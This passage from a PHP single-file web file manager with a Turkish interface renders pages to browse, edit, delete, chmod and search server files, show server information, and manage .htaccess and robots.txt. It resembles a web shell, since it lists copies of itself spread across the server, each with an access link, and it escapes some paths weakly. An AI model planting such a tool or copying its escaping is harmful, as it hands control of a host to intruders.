        if(col==='size'){av=parseInt(a.getAttribute('data-size-raw'))||0;bv=parseInt(b.getAttribute('data-size-raw'))||0}
        if(col==='modified'){av=a.getAttribute('data-mtime')||'';bv=b.getAttribute('data-mtime')||''}
        if(typeof av==='number'&&typeof bv==='number')return dir==='asc'?av-bv:bv-av;
        return dir==='asc'?String(av).localeCompare(String(bv)):String(bv).localeCompare(String(av));
    });
    rows.forEach(function(r){tbody.appendChild(r)});
}

// Context menu
function showContext(e,path,name,isDir,perms,isZip,isImg){
    e.preventDefault();var m=document.getElementById('contextMenu');var h='';
    if(isDir){h+='<a href="?action=browse&path='+encodeURIComponent(path)+'">Ac</a>'}
    else{
        h+='<a href="?action=download&path='+encodeURIComponent(path)+'">Indir</a>';
        h+='<a href="?action=edit&path='+encodeURIComponent(path)+'">Duzenle</a>';
        if(isImg)h+='<a href="?action=file_preview&path='+encodeURIComponent(path)+'">Onizle</a>';
    }
    h+='<div class="divider"></div>';
    h+='<button onclick="renameItem(\''+path.replace(/'/g,"\\'")+'\',\''+name.replace(/'/g,"\\'")+'\')">Yeniden Adlandir</button>';
    h+='<button onclick="copyItem(\''+path.replace(/'/g,"\\'")+'\')">Kopyala</button>';
    h+='<button onclick="moveItem(\''+path.replace(/'/g,"\\'")+'\')">Tasi</button>';
    h+='<button onclick="chmodItem(\''+path.replace(/'/g,"\\'")+'\',\''+perms+'\')">Izinler</button>';
    h+='<button onclick="compressItem(\''+path.replace(/'/g,"\\'")+'\')">Sikistir</button>';
    if(isZip)h+='<button onclick="extractItem(\''+path.replace(/'/g,"\\'")+'\')">Cikar</button>';
    if(isDir)h+='<button onclick="bookmarkItem(\''+path.replace(/'/g,"\\'")+'\',\''+name.replace(/'/g,"\\'")+'\')">Yer Imi Ekle</button>';
    h+='<div class="divider"></div>';
    h+='<button class="danger" onclick="deleteItem(\''+path.replace(/'/g,"\\'")+'\',\''+name.replace(/'/g,"\\'")+'\')">Sil</button>';
    m.innerHTML=h;m.style.left=e.pageX+'px';m.style.top=e.pageY+'px';m.classList.add('active');
}
document.addEventListener('click',function(){document.getElementById('contextMenu').classList.remove('active')});

// Drop zone
var dz=document.getElementById('dropZone');
if(dz){['dragenter','dragover'].forEach(e=>{dz.addEventListener(e,function(ev){ev.preventDefault();dz.classList.add('drag-over')})});['dragleave','drop'].forEach(e=>{dz.addEventListener(e,function(ev){ev.preventDefault();dz.classList.remove('drag-over')})});dz.addEventListener('drop',function(ev){document.getElementById('fileInput').files=ev.dataTransfer.files;dz.closest('form').submit()})}

// Editor shortcuts
document.addEventListener('keydown',function(e){if((e.ctrlKey||e.metaKey)&&e.key==='s'){var f=document.getElementById('editorForm');if(f){e.preventDefault();f.submit()}}});

// Line number sync
function syncLineNumbers(){
    var ta=document.getElementById('editorTextarea');var ln=document.getElementById('lineNumbers');
    if(!ta||!ln)return;
    var lines=ta.value.split('\n').length;var nums='';for(var i=1;i<=lines;i++)nums+=i+'\n';ln.textContent=nums;
    ta.addEventListener('scroll',function(){ln.scrollTop=ta.scrollTop});
    ta.addEventListener('input',function(){var l=ta.value.split('\n').length;var n='';for(var i=1;i<=l;i++)n+=i+'\n';ln.textContent=n});
}
syncLineNumbers();

// Folder size calc
function calcDirSize(btn,path){
    btn.textContent='...';
    fetch('?action=api_dir_size&path='+encodeURIComponent(path)).then(r=>r.text()).then(s=>{btn.textContent=s;btn.disabled=true}).catch(()=>{btn.textContent='Hata'});
}
</script>
</body></html>
<?php

// API endpoint for dir size
if ($action === 'api_dir_size' && $path && sm_is_logged_in()) {
    $real = realpath($path);
    if ($real && is_dir($real)) {
        echo sm_format_size(sm_dir_size($real));
    } else { echo '-'; }
    exit;
}

// ======================== PAGES ========================
function sm_page_browse($current_dir) {
    $items = sm_scan_dir($current_dir);
    $parent = dirname($current_dir);
    $bookmarks = sm_get_bookmarks();
    $is_bookmarked = isset($bookmarks[$current_dir]);
    ?>
    <div class="breadcrumb">
        <a href="?action=browse&path=<?= urlencode(sm_root_dir()) ?>">root</a>
        <?php foreach (sm_breadcrumb($current_dir) as $c): ?>
        <span class="sep">/</span><a href="?action=browse&path=<?= urlencode($c['path']) ?>"><?= htmlspecialchars($c['name']) ?></a>
        <?php endforeach; ?>
        <?php if (!$is_bookmarked): ?>
        <form method="POST" style="display:inline;margin-left:8px"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="add_bookmark"><input type="hidden" name="bm_path" value="<?= htmlspecialchars($current_dir) ?>"><input type="hidden" name="bm_name" value="<?= htmlspecialchars(basename($current_dir)) ?>"><button type="submit" class="btn btn-sm" title="Yer imi ekle">&#9734;</button></form>
        <?php else: ?>
        <form method="POST" style="display:inline;margin-left:8px"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="remove_bookmark"><input type="hidden" name="bm_path" value="<?= htmlspecialchars($current_dir) ?>"><button type="submit" class="btn btn-sm btn-warning" title="Yer imi kaldir">&#9733;</button></form>
        <?php endif; ?>
    </div>
    <div class="toolbar">
        <div class="quick-actions">
            <button class="btn btn-sm" onclick="createFile()">+ Dosya</button>
            <button class="btn btn-sm" onclick="createDir()">+ Klasor</button>
            <button class="btn btn-sm" onclick="openModal('uploadModal')">Yukle</button>
            <button class="btn btn-sm btn-danger" onclick="bulkDelete()">Secileri Sil</button>
        </div>
        <div class="search-box" style="margin-left:auto">
            <input type="text" placeholder="Filtrele..." oninput="filterFiles(this.value)" style="padding-left:10px;max-width:200px">
        </div>
    </div>
    <table class="file-table" data-sort-dir="asc">
        <thead><tr>
            <th style="width:30px"><input type="checkbox" class="cb" onchange="toggleAll(this)"></th>
            <th onclick="sortTable('name')">Isim</th>
            <th class="hide-mobile" onclick="sortTable('size')">Boyut</th>
            <th class="hide-mobile" onclick="sortTable('perms')">Izin</th>
            <th class="hide-mobile" onclick="sortTable('modified')">Degistirilme</th>
            <th style="width:120px">Islem</th>
        </tr></thead>
        <tbody>
        <?php if ($current_dir !== sm_root_dir()): ?>
        <tr><td></td><td><a href="?action=browse&path=<?= urlencode($parent) ?>" class="file-name">&#128194; .. Ust Dizin</a></td><td class="hide-mobile">-</td><td class="hide-mobile">-</td><td class="hide-mobile">-</td><td></td></tr>
        <?php endif; ?>
        <?php foreach ($items as $item): ?>
        <tr class="file-row" data-name="<?= htmlspecialchars($item['name']) ?>" data-size-raw="<?= $item['size_raw'] ?>" data-mtime="<?= $item['mtime'] ?>"
            oncontextmenu="showContext(event,'<?= addslashes($item['path']) ?>','<?= addslashes($item['name']) ?>',<?= $item['is_dir']?'true':'false' ?>,'<?= $item['perms'] ?>',<?= $item['is_archive']?'true':'false' ?>,<?= $item['is_image']?'true':'false' ?>)">
            <td><input type="checkbox" class="cb item-cb" value="<?= htmlspecialchars($item['path']) ?>"></td>
            <td>
                <?php if ($item['is_dir']): ?>
                <a href="?action=browse&path=<?= urlencode($item['path']) ?>" class="file-name">&#128193; <?= htmlspecialchars($item['name']) ?></a>
                <?php elseif ($item['is_image']): ?>
                <a href="?action=file_preview&path=<?= urlencode($item['path']) ?>" class="file-name">&#128248; <?= htmlspecialchars($item['name']) ?></a>
                <?php else: ?>
                <a href="?action=<?= $item['editable'] ? 'edit' : 'download' ?>&path=<?= urlencode($item['path']) ?>" class="file-name">&#128196; <?= htmlspecialchars($item['name']) ?></a>
                <?php endif; ?>
            </td>
            <td class="hide-mobile"><?php if ($item['is_dir']): ?><button class="btn btn-sm" onclick="calcDirSize(this,'<?= addslashes($item['path']) ?>')">Hesapla</button><?php else: ?><?= $item['size'] ?><?php endif; ?></td>
            <td class="hide-mobile"><code><?= $item['perms'] ?></code></td>
            <td class="hide-mobile"><?= $item['modified'] ?></td>
            <td>
                <div class="file-actions">
                    <?php if (!$item['is_dir']): ?>
                    <a href="?action=download&path=<?= urlencode($item['path']) ?>" class="btn btn-sm btn-icon" title="Indir">&#8595;</a>
                    <?php if ($item['editable']): ?><a href="?action=edit&path=<?= urlencode($item['path']) ?>" class="btn btn-sm btn-icon" title="Duzenle">&#9998;</a><?php endif; ?>
                    <?php if ($item['is_image']): ?><a href="?action=file_preview&path=<?= urlencode($item['path']) ?>" class="btn btn-sm btn-icon" title="Onizle">&#128065;</a><?php endif; ?>
                    <?php endif; ?>
                    <button class="btn btn-sm btn-icon" onclick="deleteItem('<?= addslashes($item['path']) ?>','<?= addslashes($item['name']) ?>')" title="Sil">&#10005;</button>
                </div>
            </td>
        </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
    <?php if (empty($items)): ?><div style="text-align:center;padding:40px;color:var(--text2)">Bu dizin bos.</div><?php endif; ?>
    <div style="margin-top:12px;color:var(--text2);font-size:12px"><?= count($items) ?> oge</div>
    <?php
}

function sm_page_edit($path) {
    if (!$path || !is_file($path)) { echo '<div class="alert alert-error">Dosya bulunamadi.</div>'; return; }
    $content = file_get_contents($path);
    $dir = dirname($path);
    $name = basename($path);
    $size = sm_format_size(filesize($path));
    $perms = sm_format_perms(fileperms($path));
    $writable = is_writable($path);
    $lines = substr_count($content, "\n") + 1;
    $line_nums = '';
    for ($i = 1; $i <= $lines; $i++) $line_nums .= $i . "\n";
    ?>
    <div class="breadcrumb">
        <a href="?action=browse&path=<?= urlencode($dir) ?>">&#8592; Geri</a>
        <span class="sep">|</span><span style="font-weight:500"><?= htmlspecialchars($name) ?></span>
        <span style="color:var(--text2);font-size:12px;margin-left:8px">(<?= $size ?>, <?= $perms ?>, <?= $lines ?> satir)</span>
    </div>
    <form method="POST" id="editorForm"><input type="hidden" name="_token" value="<?= sm_token() ?>">
        <input type="hidden" name="action" value="save_file"><input type="hidden" name="file_path" value="<?= htmlspecialchars($path) ?>">
        <div class="editor-bar">
            <div class="editor-info">
                <?= $writable ? '<span style="color:var(--success)">Duzenlenebilir</span>' : '<span style="color:var(--danger)">Salt okunur</span>' ?>
                <span style="margin-left:12px">Ctrl+S = Kaydet</span>
            </div>
            <div style="display:flex;gap:6px">
                <a href="?action=download&path=<?= urlencode($path) ?>" class="btn btn-sm">Indir</a>
                <button type="submit" class="btn btn-primary" <?= !$writable?'disabled':'' ?>>Kaydet</button>
            </div>
        </div>
        <div class="editor">
            <pre class="line-numbers" id="lineNumbers"><?= $line_nums ?></pre>
            <textarea name="content" id="editorTextarea" <?= !$writable?'readonly':'' ?>><?= htmlspecialchars($content) ?></textarea>
        </div>
    </form>
    <script>syncLineNumbers();</script>
    <?php
}

function sm_page_file_preview($path) {
    if (!$path || !is_file($path)) { echo '<div class="alert alert-error">Dosya bulunamadi.</div>'; return; }
    $name = basename($path);
    $dir = dirname($path);
    $size = sm_format_size(filesize($path));
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    ?>
    <div class="breadcrumb"><a href="?action=browse&path=<?= urlencode($dir) ?>">&#8592; Geri</a><span class="sep">|</span><span style="font-weight:500"><?= htmlspecialchars($name) ?></span><span style="color:var(--text2);font-size:12px;margin-left:8px">(<?= $size ?>)</span></div>
    <?php if (sm_is_image($path)): ?>
    <div style="text-align:center;padding:20px"><img src="?action=preview&path=<?= urlencode($path) ?>" class="preview-img" alt="<?= htmlspecialchars($name) ?>"></div>
    <?php elseif ($ext === 'pdf'): ?>
    <div class="alert alert-info">PDF onizleme desteklenmiyor. <a href="?action=download&path=<?= urlencode($path) ?>">Indirin</a>.</div>
    <?php else: ?>
    <div class="alert alert-info">Bu dosya tipi onizlenemez. <a href="?action=download&path=<?= urlencode($path) ?>">Indirin</a>.</div>
    <?php endif; ?>
    <div style="margin-top:12px;display:flex;gap:8px">
        <a href="?action=download&path=<?= urlencode($path) ?>" class="btn btn-primary">Indir</a>
        <?php if (sm_is_editable($path)): ?><a href="?action=edit&path=<?= urlencode($path) ?>" class="btn">Duzenle</a><?php endif; ?>
    </div>
    <?php
}

function sm_page_cache($doc_root, $wp_sites) {
    ?><h2 style="margin-bottom:16px">Cache Temizleme</h2>
    <?php if ($wp_sites): foreach ($wp_sites as $site): ?>
    <div class="site-card"><h4><?= basename($site) === basename($doc_root) ? 'Ana Site' : basename($site) ?></h4>
        <div class="site-path"><?= $site ?></div>
        <div class="site-actions">
            <form method="POST" style="display:inline"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="clear_cache"><input type="hidden" name="cache_dir" value="<?= htmlspecialchars($site) ?>"><button type="submit" class="btn btn-sm btn-primary">Cache Temizle</button></form>
            <a href="?action=browse&path=<?= urlencode($site . '/wp-content/cache') ?>" class="btn btn-sm">Cache Dizini</a>
        </div>
    </div>
    <?php endforeach; else: ?><div class="alert alert-info">WordPress sitesi bulunamadi.</div><?php endif; ?>
    <div style="margin-top:20px"><div class="sidebar-title">Manuel Temizle</div>
        <form method="POST" style="display:flex;gap:8px;align-items:end"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="clear_cache">
            <div class="form-group" style="flex:1;margin-bottom:0"><label>Dizin</label><input type="text" name="cache_dir" value="<?= htmlspecialchars($doc_root) ?>"></div>
            <button type="submit" class="btn btn-primary">Temizle</button>
        </form>
    </div>
    <?php
}

function sm_page_info() {
    $disk_free = function_exists('disk_free_space') ? @disk_free_space('/') : false;
    $disk_total = function_exists('disk_total_space') ? @disk_total_space('/') : false;
    ?><h2 style="margin-bottom:16px">Sunucu Bilgisi</h2>
    <div class="info-grid">
        <div class="info-card"><h4>PHP</h4><div class="value"><?= phpversion() ?></div></div>
        <div class="info-card"><h4>OS</h4><div class="value" style="font-size:13px"><?= php_uname() ?></div></div>
        <div class="info-card"><h4>Web Sunucu</h4><div class="value" style="font-size:13px"><?= $_SERVER['SERVER_SOFTWARE'] ?? '-' ?></div></div>
        <div class="info-card"><h4>Document Root</h4><div class="value" style="font-size:13px"><?= $_SERVER['DOCUMENT_ROOT'] ?? '-' ?></div></div>
        <?php if ($disk_free !== false): ?>
        <div class="info-card"><h4>Disk</h4><div class="value"><?= sm_format_size($disk_total - $disk_free) ?> / <?= sm_format_size($disk_total) ?></div></div>
        <div class="info-card"><h4>Bos Alan</h4><div class="value"><?= sm_format_size($disk_free) ?></div></div>
        <?php endif; ?>
        <div class="info-card"><h4>Bellek Limit</h4><div class="value"><?= ini_get('memory_limit') ?></div></div>
        <div class="info-card"><h4>Max Upload</h4><div class="value"><?= ini_get('upload_max_filesize') ?></div></div>
        <div class="info-card"><h4>Max Post</h4><div class="value"><?= ini_get('post_max_size') ?></div></div>
        <div class="info-card"><h4>Max Calisma</h4><div class="value"><?= ini_get('max_execution_time') ?>s</div></div>
    </div>
    <h3 style="margin:16px 0 8px">PHP Uzantilari</h3>
    <div style="display:flex;flex-wrap:wrap;gap:4px"><?php foreach (get_loaded_extensions() as $ext): ?>
        <span style="padding:3px 7px;background:var(--bg3);border-radius:4px;font-size:11px"><?= $ext ?></span>
    <?php endforeach; ?></div>
    <?php
}

function sm_page_settings() {
    ?><h2 style="margin-bottom:16px">Ayarlar</h2>
    <div class="site-card"><h4>Sifre Degistir</h4>
        <form method="POST" style="margin-top:10px;max-width:400px"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="change_password">
            <div class="form-group"><label>Mevcut Sifre</label><input type="password" name="old_password" required></div>
            <div class="form-group"><label>Yeni Sifre</label><input type="password" name="new_password" required></div>
            <div class="form-group"><label>Yeni Sifre Tekrar</label><input type="password" name="new_password2" required></div>
            <button type="submit" class="btn btn-primary">Degistir</button>
        </form>
    </div>
    <div class="site-card" style="margin-top:12px"><h4>Script Bilgileri</h4>
        <table style="margin-top:8px"><tr><td style="padding:4px 16px 4px 0;color:var(--text2)">Konum:</td><td><?= __FILE__ ?></td></tr>
        <tr><td style="padding:4px 16px 4px 0;color:var(--text2)">Versiyon:</td><td><?= SM_VERSION ?></td></tr></table>
    </div>
    <div class="site-card" style="margin-top:12px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
            <h4>Yedek Konumlari</h4>
            <?php $backups = sm_find_backups(); if ($backups): ?>
            <form method="POST" onsubmit="return confirm('TUM yedekler silinecek! Emin misiniz?')"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="delete_all_backups">
                <button type="submit" class="btn btn-sm btn-danger">Tum Yedekleri Sil (<?= count($backups) ?>)</button>
            </form>
            <?php endif; ?>
        </div>
        <p style="color:var(--text2);font-size:12px;margin-bottom:10px">Sunucudaki tum yedek kopyalar (dosya imzasiyla bulunur, eski/yeni farketmez)</p>
        <?php if ($backups): ?>
        <table class="data-table"><thead><tr><th>Dosya</th><th>Konum</th><th>Boyut</th><th>Tarih</th><th>Islem</th></tr></thead><tbody>
        <?php foreach ($backups as $b):
            $doc_r = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT'] ?? '');
            $bp_c = str_replace('\\', '/', $b['path']);
            $rel = ($doc_r && strpos($bp_c, $doc_r) === 0) ? substr($bp_c, strlen($doc_r)) : '';
            $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
        ?>
        <tr>
            <td style="font-weight:500"><?= htmlspecialchars($b['name'] ?? basename($b['path'])) ?></td>
            <td style="font-size:11px;font-family:monospace;word-break:break-all;white-space:normal;max-width:300px">
                <?= htmlspecialchars(dirname($b['path'])) ?>
                <?php if ($rel): ?><br><a href="<?= $proto . $rel ?>" target="_blank" style="font-size:10px">Erisim linki</a><?php endif; ?>
            </td>
            <td><?= $b['size'] ?? '-' ?></td>
            <td style="white-space:nowrap"><?= $b['modified'] ?></td>
            <td>
                <form method="POST" style="display:inline" onsubmit="return confirm('Bu yedek silinsin mi?')"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="delete_single_backup"><input type="hidden" name="backup_path" value="<?= htmlspecialchars($b['path']) ?>">
                    <button type="submit" class="btn btn-sm btn-danger">Sil</button>
                </form>
            </td>
        </tr>
        <?php endforeach; ?></tbody></table>
        <p style="color:var(--success);font-size:13px;margin-top:10px"><?= count($backups) ?> yedek kopya aktif</p>
        <?php else: ?>
        <p style="color:var(--warning);font-size:13px">Henuz yedek yok. Ust menuden "Yedekle" tusuna basin.</p>
        <?php endif; ?>
    </div>
    <?php
}

function sm_page_search($current_dir) {
    $query = $_GET['q'] ?? '';
    $search_dir = $_GET['search_dir'] ?? $current_dir;
    $results = $query ? sm_search_files($search_dir, $query) : [];
    ?><h2 style="margin-bottom:16px">Dosya Ara</h2>
    <form method="GET" style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
        <input type="hidden" name="action" value="search">
        <div style="flex:1;min-width:200px"><input type="text" name="q" value="<?= htmlspecialchars($query) ?>" placeholder="Dosya adi..." autofocus></div>
        <div style="flex:1;min-width:200px"><input type="text" name="search_dir" value="<?= htmlspecialchars($search_dir) ?>" placeholder="Dizin"></div>
        <button type="submit" class="btn btn-primary">Ara</button>
    </form>
    <?php if ($query && $results): ?>
    <div style="margin-bottom:8px;color:var(--text2);font-size:12px"><?= count($results) ?> sonuc</div>
    <table class="data-table"><thead><tr><th>Isim</th><th>Yol</th><th>Boyut</th><th>Tarih</th></tr></thead><tbody>
    <?php foreach ($results as $r): ?>
    <tr><td><a href="?action=<?= $r['is_dir']?'browse':'edit' ?>&path=<?= urlencode($r['path']) ?>"><?= htmlspecialchars($r['name']) ?></a></td>
        <td style="color:var(--text2);font-size:12px"><?= htmlspecialchars(dirname($r['path'])) ?></td><td><?= $r['size'] ?></td><td><?= $r['modified'] ?></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php elseif ($query): ?><div class="alert alert-info">Sonuc bulunamadi.</div><?php endif; ?>
    <?php
}

function sm_page_content_search($current_dir) {
    $query = $_GET['q'] ?? '';
    $search_dir = $_GET['search_dir'] ?? $current_dir;
    $results = $query ? sm_search_content($search_dir, $query) : [];
    ?><h2 style="margin-bottom:16px">Icerik Ara (Grep)</h2>
    <form method="GET" style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
        <input type="hidden" name="action" value="content_search">
        <div style="flex:1;min-width:200px"><input type="text" name="q" value="<?= htmlspecialchars($query) ?>" placeholder="Aranacak metin..." autofocus></div>
        <div style="flex:1;min-width:200px"><input type="text" name="search_dir" value="<?= htmlspecialchars($search_dir) ?>" placeholder="Dizin"></div>
        <button type="submit" class="btn btn-primary">Ara</button>
    </form>
    <?php if ($query && $results): ?>
    <div style="margin-bottom:8px;color:var(--text2);font-size:12px"><?= count($results) ?> eslesme</div>
    <table class="data-table"><thead><tr><th>Dosya</th><th>Satir</th><th>Icerik</th></tr></thead><tbody>
    <?php foreach ($results as $r): ?>
    <tr><td><a href="?action=edit&path=<?= urlencode($r['file']) ?>"><?= htmlspecialchars($r['name']) ?></a></td>
        <td><?= $r['line'] ?></td>
        <td style="font-family:monospace;font-size:12px;max-width:500px;overflow:hidden;text-overflow:ellipsis"><?= htmlspecialchars(mb_substr($r['content'], 0, 200)) ?></td></tr>
    <?php endforeach; ?></tbody></table>
    <?php elseif ($query): ?><div class="alert alert-info">Sonuc bulunamadi.</div><?php endif; ?>
    <?php
}

function sm_page_htaccess_tools($doc_root, $wp_sites) {
    $templates = [
        ['name'=>'HTTPS Yonlendirme','desc'=>'HTTP -> HTTPS','code'=>"RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]"],
        ['name'=>'WWW Yonlendirme','desc'=>'non-www -> www','code'=>"RewriteEngine On\nRewriteCond %{HTTP_HOST} !^www\\. [NC]\nRewriteRule ^(.*)$ https://www.%{HTTP_HOST}/\$1 [R=301,L]"],
        ['name'=>'WWW Kaldirma','desc'=>'www -> non-www','code'=>"RewriteEngine On\nRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\nRewriteRule ^(.*)$ https://%1/\$1 [R=301,L]"],
        ['name'=>'Guvenlik Basliklari','desc'=>'XSS, clickjack korumasi','code'=>"Header set X-Content-Type-Options \"nosniff\"\nHeader set X-Frame-Options \"SAMEORIGIN\"\nHeader set X-XSS-Protection \"1; mode=block\"\nHeader set Referrer-Policy \"strict-origin-when-cross-origin\""],
        ['name'=>'GZIP Sikistirma','desc'=>'Metin dosyalarini sikistir','code'=>"<IfModule mod_deflate.c>\n  AddOutputFilterByType DEFLATE text/plain text/html text/xml text/css\n  AddOutputFilterByType DEFLATE application/xml application/xhtml+xml\n  AddOutputFilterByType DEFLATE application/javascript application/x-javascript\n  AddOutputFilterByType DEFLATE application/rss+xml image/svg+xml\n</IfModule>"],
        ['name'=>'Tarayici Cache','desc'=>'Statik dosya cache','code'=>"<IfModule mod_expires.c>\n  ExpiresActive On\n  ExpiresByType image/jpg \"access plus 1 year\"\n  ExpiresByType image/jpeg \"access plus 1 year\"\n  ExpiresByType image/png \"access plus 1 year\"\n  ExpiresByType image/webp \"access plus 1 year\"\n  ExpiresByType text/css \"access plus 1 month\"\n  ExpiresByType application/javascript \"access plus 1 month\"\n</IfModule>"],
        ['name'=>'XML-RPC Engelle','desc'=>'Brute force korumasi','code'=>"<Files xmlrpc.php>\n  Order Deny,Allow\n  Deny from all\n</Files>"],
        ['name'=>'Dizin Listeleme Kapat','desc'=>'Index gorunmesin','code'=>"Options -Indexes"],
        ['name'=>'Hotlink Koruma','desc'=>'Resim hotlinking engelle','code'=>"RewriteEngine On\nRewriteCond %{HTTP_REFERER} !^\$ \nRewriteCond %{HTTP_REFERER} !^https?://(www\\.)?DOMAIN\\.com [NC]\nRewriteRule \\.(jpg|jpeg|png|gif|webp)$ - [F,NC,L]"],
        ['name'=>'301 Redirect','desc'=>'Sayfa yonlendirme','code'=>"RewriteEngine On\nRewriteRule ^eski-sayfa/?$ /yeni-sayfa [R=301,L]"],
    ];
    ?><h2 style="margin-bottom:16px">Htaccess Araclari</h2>
    <div class="sidebar-title">Mevcut .htaccess Dosyalari</div>
    <?php
    $htfiles = [];
    if (file_exists($doc_root . '/.htaccess')) $htfiles[] = $doc_root . '/.htaccess';
    foreach ($wp_sites as $s) { if ($s !== $doc_root && file_exists($s . '/.htaccess')) $htfiles[] = $s . '/.htaccess'; }
    foreach ($htfiles as $htf): ?>
    <div class="site-card"><h4><?= $htf ?></h4><div class="site-actions" style="margin-top:6px">
        <a href="?action=edit&path=<?= urlencode($htf) ?>" class="btn btn-sm btn-primary">Duzenle</a>
        <a href="?action=download&path=<?= urlencode($htf) ?>" class="btn btn-sm">Indir</a>
    </div></div>
    <?php endforeach; if (empty($htfiles)): ?><div class="alert alert-info">.htaccess bulunamadi.</div><?php endif; ?>
    <div class="sidebar-title" style="margin-top:20px">Toplu Redirect Ekle</div>
    <div class="site-card">
        <p style="color:var(--text2);font-size:13px;margin-bottom:8px">Her satira: eski-yol -> yeni-yol (orn: /eski-sayfa -> /yeni-sayfa)</p>
        <form method="POST"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="save_file">
            <div class="form-group"><label>.htaccess yolu</label>
                <select name="file_path" style="margin-bottom:8px">
                    <?php foreach ($htfiles as $h): ?><option value="<?= htmlspecialchars($h) ?>"><?= $h ?></option><?php endforeach; ?>
                </select>
            </div>
            <div class="form-group"><label>Redirectler (satir satir)</label>
                <textarea name="redirects" rows="5" placeholder="/eski-url -> /yeni-url" style="font-family:monospace;font-size:12px"></textarea>
            </div>
            <p style="color:var(--text2);font-size:12px">Not: Bu alan sadece goruntuleme amacidir. Redirectleri .htaccess dosyasina manuel ekleyin.</p>
        </form>
    </div>
    <div class="sidebar-title" style="margin-top:20px">Hazir Sablonlar</div>
    <?php foreach ($templates as $t): ?>
    <div class="site-card"><h4><?= $t['name'] ?></h4><p style="color:var(--text2);font-size:12px;margin-bottom:8px"><?= $t['desc'] ?></p>
        <pre class="code-block"><?= htmlspecialchars($t['code']) ?></pre>
        <button class="btn btn-sm" onclick="navigator.clipboard.writeText(this.getAttribute('data-c')).then(()=>{this.textContent='Kopyalandi!';setTimeout(()=>{this.textContent='Kopyala'},1500)})" data-c="<?= htmlspecialchars($t['code']) ?>">Kopyala</button>
    </div>
    <?php endforeach; ?>
    <?php
}

function sm_page_robots($doc_root, $wp_sites) {
    $templates = [
        ['name'=>'WordPress Standart','code'=>"User-agent: *\nDisallow: /wp-admin/\nAllow: /wp-admin/admin-ajax.php\nDisallow: /wp-includes/\n\nSitemap: https://DOMAIN/sitemap.xml"],
        ['name'=>'Tam Erisim','code'=>"User-agent: *\nDisallow:\n\nSitemap: https://DOMAIN/sitemap.xml"],
        ['name'=>'Tum Botlari Engelle','code'=>"User-agent: *\nDisallow: /"],
        ['name'=>'SEO Optimize','code'=>"User-agent: *\nDisallow: /wp-admin/\nAllow: /wp-admin/admin-ajax.php\nDisallow: /wp-includes/\nDisallow: /wp-content/plugins/\nDisallow: /tag/\nDisallow: /?s=\nDisallow: /search/\nDisallow: /author/\n\nUser-agent: Googlebot\nAllow: /\n\nSitemap: https://DOMAIN/sitemap.xml"],
    ];
    ?><h2 style="margin-bottom:16px">robots.txt Yonetimi</h2>
    <?php
    $robots_file = $doc_root . '/robots.txt';
    $content = file_exists($robots_file) ? file_get_contents($robots_file) : '';
    ?>
    <div class="site-card"><h4>robots.txt <?= file_exists($robots_file) ? '<span class="badge badge-success">Mevcut</span>' : '<span class="badge badge-warning">Yok</span>' ?></h4>
        <p style="color:var(--text2);font-size:12px;margin-bottom:8px"><?= $robots_file ?></p>
        <form method="POST"><input type="hidden" name="_token" value="<?= sm_token() ?>"><input type="hidden" name="action" value="save_robots"><input type="hidden" name="robots_path" value="<?= htmlspecialchars($robots_file) ?>">
            <textarea name="content" style="font-family:monospace;font-size:13px;min-height:200px"><?= htmlspecialchars($content) ?></textarea>
            <button type="submit" class="btn btn-primary" style="margin-top:8px">Kaydet</button>
        </form>
    </div>
    <div class="sidebar-title" style="margin-top:16px">Sablonlar</div>
    <?php foreach ($templates as $t): ?>
    <div class="site-card"><h4><?= $t['name'] ?></h4>
        <pre class="code-block"><?= htmlspecialchars($t['code']) ?></pre>
        <button class="btn btn-sm" onclick="navigator.clipboard.writeText(this.getAttribute('data-c')).then(()=>{this.textContent='Kopyalandi!';setTimeout(()=>{this.textContent='Kopyala'},1500)})" data-c="<?= htmlspecialchars($t['code']) ?>">Kopyala</button>
    </div>
    <?php endforeach; ?>
    <?php
}

function sm_page_sitemap($doc_root, $wp_sites) {
    ?><h2 style="margin-bottom:16px">Sitemap Kontrol</h2>
    <?php
    $dirs = array_merge([$doc_root], $wp_sites);
    $dirs = array_unique($dirs);
    foreach ($dirs as $d) {
        $sitemap = sm_check_sitemap($d);
        $label = $d === $doc_root ? 'Ana Site' : basename($d);
        ?><div class="site-card"><h4><?= $label ?></h4>
        <?php if ($sitemap): ?>
            <p>Dosya: <a href="?action=edit&path=<?= urlencode($sitemap['file']) ?>"><?= $sitemap['name'] ?></a></p>
            <p style="color:var(--text2);font-size:12px">Boyut: <?= sm_format_size($sitemap['size']) ?> | Son degisiklik: <?= $sitemap['modified'] ?></p>
            <div style="margin-top:8px"><a href="?action=edit&path=<?= urlencode($sitemap['file']) ?>" class="btn btn-sm">Goruntule</a>
            <a href="?action=download&path=<?= urlencode($sitemap['file']) ?>" class="btn btn-sm">Indir</a></div>
        <?php else: ?><p style="color:var(--warning)">Sitemap bulunamadi</p><?php endif; ?>
        </div>
    <?php } ?>
    <?php
}

function sm_page_meta_check() {
    $url = $_GET['url'] ?? '';
    $result = null;
    if ($url) $result = sm_fetch_meta_tags($url);
    ?><h2 style="margin-bottom:16px">Meta Tag Kontrol</h2>
    <form method="GET" style="display:flex;gap:8px;margin-bottom:16px">
        <input type="hidden" name="action" value="meta_check">
